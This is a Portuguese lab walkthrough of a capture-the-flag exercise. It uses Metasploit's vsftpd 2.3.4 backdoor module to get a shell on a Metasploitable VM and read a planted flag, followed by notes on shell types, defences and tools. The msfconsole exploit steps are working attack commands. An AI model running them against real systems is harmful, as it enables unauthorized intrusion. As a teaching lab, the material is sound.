&nbsp; 

### 1º - Abrir e logar na VM do metasploitable com o login padrão.

login: msfadmin

senha: msfadmin

![login metasploitable](https://i.imgur.com/8GQ3uHb.jpeg) 

&nbsp;

### 2º - Criar um arquivo de texto no metasploitable com o objetivo de encontrarmos este arquivo à partir de outra máquina (Capture the Flag)

Comando para criar o arquivo txt: echo "Conteúdo do seu arquivo aqui" > nome_do_arquivo.txt

Exemplo: echo "Me encontre" > Flag.txt

Comando para visualizar os arquivos criados: ls

Comando para acessar os arquivos: nano nome_do_arquivo.txt

Comando para sair do arquivo: Ctrl X

Comando para excluir arquivos: rm nome_do_arquivo.txt

![criar arquivo](https://i.imgur.com/3KJeOIA.jpeg)

![acessar arquivo](https://i.imgur.com/ik80Ey4.jpeg)

&nbsp;

### 3º - No Terminal no Kali Linux, iniciar o Metasploit através do comando: msfconsole

![mfsconsole](https://i.imgur.com/LEHJmfo.jpeg)

&nbsp;

### 4º - Buscar um exploit para explorar o vsftpd

Comando: search vsftpd

![search vsftpd](https://i.imgur.com/YhJQuCH.jpeg)

&nbsp;

### 5º - Descobrir mais informações sobre esse exploit. Aqui descobrimos o que ele pede, nesse caso é um host e uma porta, que é a 21 por padrão.

Comando: info exploit/unix/ftp/vsftpd_234_backdoor

![info exploit](https://i.imgur.com/uXdMYKK.jpeg)

&nbsp;

### 6º - Após descobrir as informações, vamos usá-lo. Para usá-lo, basta substituir a palavra info por use no comando. Ao aparecer as letras vermelhas entre parênteses significa que já estamos utilizando o backdoor.

Comando: use exploit/unix/ftp/vsftpd_234_backdoor

![use exploit](https://i.imgur.com/p2ko8Zm.jpeg)

&nbsp;

### 7º - Em seguida, acionamos o comando show options para nos certificarmos que o host ainda não está associado a nenhum número IP e que precisamos configurar nosso IP de destino. 

Comando: show options

![show options](https://i.imgur.com/7CHtCYo.jpeg)

&nbsp;

### 8º - Configurando IP de destino. Para localizarmos o IP da máquina a ser acessada, precisamos localizar seu IP no metasploitable com o seguinte comando: 

Comando: ip addr

![ip addr](https://i.imgur.com/lkG0CDH.jpeg)

&nbsp;

### 9º - Agora que temos o número IP, digitamos o seguinte comando no terminal do Kali Linux para efetuarmos a configuração do host remoto:

Comando: set rhosts nú.me.ro.ip

Obs. rhosts é referente a remote hosts.

![set rhosts](https://i.imgur.com/SVnqsKY.jpeg)

&nbsp;

### 10º - Em seguida, visualizamos os módulos payloads:

Comando: show payloads 

Com este comando encontramos o nome do payload e descobrimos que ele é um comando Unix e que interage com conexão estabelecida, ou seja, consigo de forma remota acessar um outro computador explorando backdoor. 

![show payloads](https://i.imgur.com/gah2b12.jpeg)

&nbsp;

### 11º - Na sequência utilizamos o payload encontrado.

Comando: set payload payload/cmd/unix/interact

![set payload](https://i.imgur.com/8Uy0MYp.jpeg)

&nbsp;

Obs. Payload - Em cibersegurança, um payload é a parte maliciosa de um ataque cibernético que executa a ação prejudicial, como criptografar arquivos, roubar dados ou instalar um backdoor. Enquanto o "exploit" é o código que explora uma vulnerabilidade para entrar no sistema, o payload é a carga útil que causa o dano real uma vez que o ataque é executado. 

O termo "payload" tem suas raízes na aviação e engenharia militar, onde originalmente se referia à carga útil de uma aeronave ou míssil — a parte do equipamento projetada para alcançar um objetivo específico, como transportar passageiros ou entregar explosivos.

No contexto da cibersegurança, o termo foi adaptado para descrever a parte de um ataque cibernético que realiza a ação maliciosa, causando danos ao alvo.

Pense no exploit como o arrombamento de uma porta e no payload como o que o ladrão faz depois de entrar. O exploit permite que o ataque entre, e o payload é a ação que ele executa.

&nbsp;

### 12º - Acionamos o comando show options novamente para vermos o IP configurado e definido no host

Comando: show options

![ip configurado](https://i.imgur.com/GWkb2YB.jpeg)

&nbsp;

### 13º - O próximo passo é executar o payload (exploit). Se aparecer Found shell é porque conseguiu se conectar. 

Comando: exploit

![exploit](https://i.imgur.com/uMp54za.jpeg) 

&nbsp;

### 14º - Digitar o comando ip addr para confirmar que consegui acesso ao host remoto, nesse caso o metasploitable. 

Comando: ip addr

![ip kali](https://i.imgur.com/KPa6WlP.jpeg) 

&nbsp;

### 15º - Chegando até o arquivo flag.txt criado no metasploitable (Capture the flag) pelo terminal do Kali Linux.

Comando: ls (encontramos a pasta home)

Comando: cd home (entramos na pasta home)

Comando: ls (encontramos a pasta msfadmin)

Comando: cd msfadmin (entramos na pasta msfadmin)

Comando: ls (encontramos o arquivo criado no metasploitable que foi nomeado como flag.txt)

Comando: nano flag.txt (Abrimos e visualizamos o conteúdo do arquivo) 

![encontrando arquivo](https://i.imgur.com/rlXmxog.jpeg) 

![acessando arquivo](https://i.imgur.com/hfUMslV.jpeg)

&nbsp;

Obs. Na cibersegurança, o "shell" refere-se a uma interface para um sistema operacional, que pode ser usada tanto para fins legítimos (administração remota segura) quanto maliciosos (ataques). O uso mais comum é o Secure Shell (SSH), que protege a comunicação criptografando os dados. No entanto, o termo também é usado para descrever interfaces criadas por atacantes, como os web shells e reverse shells, que permitem acesso e controle sobre um sistema comprometido. 

&nbsp; 

Tipos de Shells e Como Funcionam:

1. Bind Shell
    
O bind shell funciona ao “amarrar” um shell em uma porta específica do sistema alvo. O atacante conecta-se diretamente a essa porta para interagir com o sistema.

Como Funciona: O sistema alvo inicia um serviço que aguarda conexões de entrada em uma porta específica. O atacante, então, conecta-se diretamente a essa porta para obter acesso.

Vantagens: Simplicidade na configuração.

Desvantagens: Requer que a porta esteja acessível, o que pode ser bloqueado por firewalls.

2. Reverse Shell
   
No reverse shell, a conexão é iniciada pelo sistema alvo em direção ao atacante. É frequentemente usado para contornar firewalls e NATs.

Como Funciona: O sistema alvo estabelece uma conexão de saída para o servidor do atacante, permitindo controle remoto.

Vantagens: Funciona mesmo quando o sistema alvo está atrás de firewalls ou NATs.

Desvantagens: Pode ser detectado por sistemas de monitoramento de tráfego.

3. Web Shell

Web shells são scripts ou arquivos maliciosos enviados para servidores web comprometidos. Eles permitem que um invasor execute comandos no servidor através de uma interface web.

Como Funciona: Um arquivo, como PHP ou ASPX, é carregado no servidor e executado para oferecer uma interface de controle remoto.

Vantagens: Flexível e pode ser acessado de qualquer navegador.

Desvantagens: Requer um vetor de ataque inicial para carregar o script no servidor.

&nbsp; 

Como se Proteger Contra Uso Indevido de Shells

Embora úteis para administradores de sistemas e profissionais de segurança, shells podem ser usados maliciosamente. Algumas práticas para proteger seus sistemas incluem:

- Monitore Atividades de Rede: Use ferramentas de monitoramento para identificar conexões suspeitas.

- Restrinja Permissões: Limite o acesso a sistemas e serviços sensíveis apenas a usuários autorizados.
  
- Atualize Software Regularmente: Mantenha servidores e aplicações atualizadas para corrigir vulnerabilidades exploráveis.
  
- Use Firewalls: Configure firewalls para bloquear portas não utilizadas e conexões não autorizadas.
  
- Implemente Whitelisting: Restrinja scripts e comandos que podem ser executados em seus servidores.

  &nbsp;
  
Ferramentas Recomendadas para Shells
Algumas ferramentas amplamente usadas para criação e detecção de shells incluem:

- Netcat: Ferramenta básica para criar shells reversos e de ligação. Site oficial
- Metasploit Framework: Oferece módulos para criação de shells personalizados. Site oficial
- PowerSploit: Ferramenta avançada para criar shells PowerShell. Repositório no GitHub
- PayloadAllTheThings: Repositório abrangente com exemplos e payloads para criação de shells e outros usos relacionados a segurança. Repositório no GitHub

&nbsp; 

Disclaimer: Esta lista é fornecida apenas para fins educativos e para uso em ambientes autorizados. Não utilize essas ferramentas para fins maliciosos ou ilegais.
